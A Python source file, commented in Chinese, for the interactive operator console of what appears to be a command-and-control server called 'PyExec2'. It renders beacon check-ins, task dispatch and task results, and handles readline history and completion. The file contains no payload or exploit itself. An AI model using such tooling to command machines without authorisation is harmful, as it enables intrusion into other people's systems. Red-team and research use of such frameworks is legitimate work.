"""
server/ui/console.py — 交互式控制台（纯 UI，T3.3/T4.6）

职责: 读输入（readline 历史/补全）、调 dispatcher.execute、渲染输出。
无任何业务逻辑——命令实现全部在 engine/commands/ 与模块层。

与 Client 通道共享同一 dispatcher（命令入口收敛，Q6 多 UI）。

事件实时渲染（Q6/10.3）: 后台转发线程轮询事件文件增量（200ms），
新事件经 safe_print 打断渲染——会话只写文件，UI 只读文件。
"""

import os as _os
import readline
import sys as _sys
import threading
import time
from typing import Optional

from server.core.log import get_logger
from server.infra.event_writer import EventWriter

logger = get_logger("console")

_FORWARD_POLL_INTERVAL = 0.2  # 秒（8.3 风险项：可接受）


def enrich_result_output(mgr, rec: dict) -> dict:
    """task_result 事件行里的 output 是摘要（≤200 字符，beacon.py 截断），
    从内存结果队列按 task_id 补全为完整输出，供 UI 完整显示。

    Returns:
        补全后的新 dict；未匹配到结果时原样返回 rec。
    """
    bid = rec.get("beacon", "")
    task_id = rec.get("task_id", "")
    if not bid or not task_id:
        return rec
    client = mgr.get_client(bid)
    if not client:
        return rec
    for r in client.results:
        if r.task_id == task_id:
            rec = dict(rec)
            rec["output"] = r.output
            break
    return rec


def render_event(rec: dict) -> str:
    """事件记录 → 控制台渲染文本（只渲染用户关注的事件，其余返回空串）。"""
    ev = rec.get("event", "")
    bid = str(rec.get("beacon", "-"))[:8]
    if ev == "connect":
        # 只渲染新上线；周期性回连的 connect 事件不刷屏
        # （事件文件仍完整记录每次 connect/disconnect，审计不丢）
        if not rec.get("first"):
            return ""
        fork = " (fork)" if rec.get("fork") else ""
        return f"[+] 上线: {bid}...{fork}"
    if ev == "disconnect":
        return ""  # 断开不渲染（避免每个回连周期刷屏）
    if ev == "task_sent":
        # 完整 task_id（36 字符 UUID）+ 完整 beacon id，便于与入队消息对照
        return f"[>] {rec.get('beacon', '-')} 任务下发: {rec.get('task_id', '')}"
    if ev == "task_result":
        # 事件行是摘要；完整输出由 enrich_result_output 补全后传入。
        # 结果从新行开始，避免长输出挤在"结果:"同一行。
        return f"[*] {rec.get('beacon', '-')} 结果:\n{rec.get('output', '')}"
    return ""


class Console:
    """交互式命令行控制台（纯 UI 前端）。"""

    def __init__(self, dispatcher, on_exit=None):
        self._dispatcher = dispatcher
        self._on_exit = on_exit
        self._running = True
        self.safe_print = print  # P4 事件转发线程会替换为 readline 安全版

    @property
    def running(self) -> bool:
        return self._running

    @property
    def dispatcher(self):
        return self._dispatcher

    def execute(self, line: str) -> str:
        """转发给命令引擎（无业务逻辑）。"""
        return self._dispatcher.execute(line)

    def stop(self) -> None:
        self._running = False


def console_loop(console: Console) -> None:
    """交互式控制台主循环。exit 经 dispatcher 触发 on_exit（server.stop）。"""

    hist_file = _os.path.expanduser("~/.pyexec2_history")
    try:
        readline.read_history_file(hist_file)
    except (FileNotFoundError, OSError):
        pass

    disp = console.dispatcher

    def _completer(text: str, state: int) -> Optional[str]:
        options = list(disp.command_names())
        try:
            for m in disp.modules.list_modules():
                options.append(m["name"])
            if disp.smods:
                for m in disp.smods.list_modules():
                    options.append(m["name"])
            for c in disp.mgr.list_clients():
                options.append(c.client_id)
        except Exception:
            pass
        matches = sorted(w for w in options if w.startswith(text))
        return matches[state] if state < len(matches) else None

    readline.set_completer(_completer)
    readline.parse_and_bind("tab: complete")

    def safe_print(*args, **kwargs):
        """后台线程安全打印，不破坏 readline 提示符。

        无论用户是否正在输入（buf 可能为空），打印后都重绘提示符；
        否则事件到达时 \r\033[K 清掉当前行后提示符就消失了。
        """
        try:
            buf = readline.get_line_buffer()
            _sys.stdout.write("\r\033[K")
        except Exception:
            buf = ""
        print(*args, **kwargs)
        _sys.stdout.write(f"pyexec> {buf}")
        _sys.stdout.flush()

    console.safe_print = safe_print

    print("PyExec2 Server Console")
    print("Type 'help' for commands, 'exit' to quit.\n")

    # 事件转发线程（T4.6）：只转发 console 启动后产生的新事件
    offset = _os.path.getsize(disp.audit.path) \
        if _os.path.isfile(disp.audit.path) else 0
    stopped = threading.Event()

    def _forward() -> None:
        nonlocal offset
        while not stopped.is_set():
            try:
                lines, new_offset = disp.audit.read_from(offset)
                if new_offset:
                    offset = new_offset
                for line in lines:
                    rec = EventWriter.parse_line(line)
                    if rec.get("event") == "task_result":
                        rec = enrich_result_output(disp.mgr, rec)
                    text = render_event(rec)
                    if text:
                        console.safe_print(text)
            except Exception:
                pass
            time.sleep(_FORWARD_POLL_INTERVAL)

    forward_thread = threading.Thread(target=_forward, daemon=True)
    forward_thread.start()

    while console.running:
        try:
            line = input("pyexec> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] exiting...")
            break

        if not line:
            continue

        output = console.execute(line)
        if output:
            _sys.stdout.write("\r\033[K")
            print(output)
            _sys.stdout.flush()

    stopped.set()
    forward_thread.join(timeout=1)

    try:
        readline.set_history_length(1000)
        readline.write_history_file(hist_file)
    except OSError:
        pass
